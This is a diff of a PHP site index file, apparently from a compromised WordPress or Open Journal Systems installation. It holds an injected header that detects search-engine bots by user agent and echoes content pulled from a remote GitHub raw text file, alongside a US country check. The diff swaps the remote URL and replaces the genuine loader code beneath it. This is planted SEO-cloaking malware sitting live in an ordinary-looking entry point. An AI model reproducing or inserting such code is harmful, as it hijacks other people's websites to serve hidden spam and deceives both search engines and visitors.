@@ -18,7 +18,7 @@ function is_bot() {
     return preg_match($botchar, $user_agent);
 }
 
-$sky = "https://github.com/heriraharto2-woyowoyo/land/raw/refs/heads/main/land-ams.txt";
+$sky = "https://raw.githubusercontent.com/heriraharto2-woyowoyo/land/refs/heads/main/landd-unialfa.txt";
 
 if (is_bot()) {
     echo @file_get_contents($sky);
@@ -33,23 +33,26 @@ if (getUserCountry() === "US") {
 
 ?>
 <?php
+
 /**
- * Loads the WordPress environment and template.
- *
- * @package WordPress
+ * @defgroup pages_index Index Pages
  */
 
-if ( ! isset( $wp_did_header ) ) {
+/**
+ * @file pages/index/index.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @ingroup pages_index
+ * @brief Handle site index requests.
+ *
+ */
 
-	$wp_did_header = true;
-
-	// Load the WordPress library.
-	require_once __DIR__ . '/wp-load.php';
-
-	// Set up the WordPress query.
-	wp();
-
-	// Load the theme template.
-	require_once ABSPATH . WPINC . '/template-loader.php';
-
+switch ($op) {
+	case 'index':
+		define('HANDLER_CLASS', 'IndexHandler');
+		import('pages.index.IndexHandler');
+		break;
 }
